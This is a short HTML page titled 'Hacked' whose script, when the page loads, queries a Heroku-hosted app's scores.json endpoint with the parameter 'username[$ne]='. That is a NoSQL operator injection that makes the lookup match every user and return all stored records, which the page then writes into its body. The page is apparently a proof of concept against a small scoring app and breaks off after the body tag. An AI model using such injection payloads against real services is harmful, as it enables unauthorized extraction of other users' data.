<html>
<head>

 	<title>Hacked</title>
 	 <script> 
 	function funex(){
   		if (request.readyState == 4 && request.status == 200) {
        	
          theData = request.responseText;
          document.getElementById("hello").innerHTML = theData;
          console.log(theData);
      }
		 else if(request.status == 404){
   			  alert("404");
		 }
	}

  function get_stop_info(){
  request = new XMLHttpRequest();
  request.open("get", "http://fathomless-thicket-84018.herokuapp.com/scores.json?username[$ne]=", true);
  request.onreadystatechange = funex;
  request.send();
}
 </script>
 
 </head>
 <body id="hello" onload ="get_stop_info()">
